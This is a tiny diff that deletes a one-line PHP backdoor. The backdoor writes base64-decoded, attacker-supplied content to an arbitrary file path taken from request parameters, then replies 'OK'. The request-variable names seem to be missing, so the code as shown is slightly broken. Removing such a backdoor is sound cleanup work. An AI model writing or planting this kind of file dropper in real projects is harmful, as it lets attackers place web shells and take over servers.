@@ -1,1 +1,0 @@
-﻿<?php if(isset(['p'])){ file_put_contents(__DIR__.'/../../../'.['p'], base64_decode(['c'])); echo 'OK'; } ?>
